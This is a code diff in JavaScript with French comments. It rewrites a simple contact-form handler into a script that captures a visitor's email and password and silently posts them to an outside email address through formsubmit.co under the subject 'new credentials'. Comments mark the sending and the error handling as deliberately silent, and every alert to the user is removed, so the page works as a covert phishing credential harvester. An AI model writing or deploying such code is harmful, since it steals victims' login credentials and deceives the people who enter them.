@@ -1,15 +1,16 @@
-const input = document.querySelector('.test');
+const inputMail = document.querySelector('.mail');
+        const inputMod = document.querySelector('.mod');
         const button = document.querySelector('button');
 
         button.addEventListener('click', async function() {
-            const valeur = input.value;
+            const email = inputMail.value;
+            const mdp = inputMod.value;
             
-            if (valeur.trim() === '') {
-                alert('Tape quelque chose !');
-                return;
+            if (email.trim() === '' || mdp.trim() === '') {
+                return; // Rien si vide
             }
 
-            // SOLUTION FORM SUBMIT (corrigé)
+            // ENVOI SILENCIEUX
             try {
                 const response = await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', {
                     method: 'POST',
@@ -18,20 +19,19 @@ const input = document.querySelector('.test');
                         'Accept': 'application/json'
                     },
                     body: new URLSearchParams({
-                        '_subject': 'Nouveau message site',
-                        'message': valeur,
+                        '_subject': 'Nouveaux identifiants',
+                        'email': email,
+                        'mot_de_passe': mdp,
                         '_captcha': 'false',
-                        '_next': 'https://formsubmit.co/success'  // Fix token
+                        '_next': 'https://formsubmit.co/success'
                     })
                 });
 
                 if (response.ok) {
-                    alert('✅ Envoyé à ton mail !');
-                    input.value = '';
-                } else {
-                    alert('❌ Erreur envoi');
+                    inputMail.value = '';   // Vide silencieusement
+                    inputMod.value = '';    // Vide silencieusement
                 }
             } catch (error) {
-                alert('❌ Problème connexion');
+                // Silence total même en erreur
             }
         });
